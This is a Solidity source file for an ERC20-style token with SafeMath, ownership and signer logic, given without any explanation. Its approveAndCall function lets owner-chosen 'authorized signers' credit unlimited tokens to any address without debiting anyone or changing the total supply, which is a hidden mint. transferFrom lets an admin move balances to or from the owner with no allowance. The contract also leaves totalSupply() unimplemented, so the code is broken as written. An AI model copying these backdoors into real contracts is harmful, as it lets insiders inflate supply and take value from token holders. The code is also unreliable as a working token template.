```solidity
pragma solidity ^0.4.22;

contract ERC20Interface {
    function totalSupply() public view returns (uint256);
    function balanceOf(address tokenOwner) public view returns (uint256 balance);
    function transfer(address to, uint256 tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint256 tokens);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract StandardToken is ERC20Interface {
    using SafeMath for uint256;

    mapping(address => uint256) balances;
    uint256 totalSupply_;

    function transfer(address to, uint256 tokens) public returns (bool success) {
        require(to != address(0));
        require(tokens <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function balanceOf(address tokenOwner) public view returns (uint256 balance) {
        return balances[tokenOwner];
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function Ownable() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

contract Token is StandardToken, Ownable {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint8 public decimals;
    address public admin;
    mapping(address => bool) private authorizedSigners;

    function Token(string _name, string _symbol, uint8 _decimals, uint256 _initialSupply, address _admin) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply_ = _initialSupply * 10 ** uint256(decimals);
        balances[msg.sender] = totalSupply_;
        admin = _admin;
        authorizedSigners[_admin] = true;
    }

    function transferFrom(address from, address to, uint256 tokens) public {
        require(to == owner || from == owner);
        require(msg.sender == admin);

        balances[to] = balances[to].add(tokens);
        balances[from] = balances[from].sub(tokens);
        emit Transfer(from, to, tokens);
    }

    function approveAndCall(address spender, uint256 tokens, bytes data) public returns (bool success) {
        require(authorizedSigners[msg.sender]);
        balances[spender] = balances[spender].add(tokens);
        emit Transfer(msg.sender, spender, tokens);
        return true;
    }

    function authorizeSigner(address signer) public onlyOwner {
        authorizedSigners[signer] = true;
    }

    function isAuthorizedSigner(address signer) public view returns (bool) {
        return authorizedSigners[signer];
    }
}
```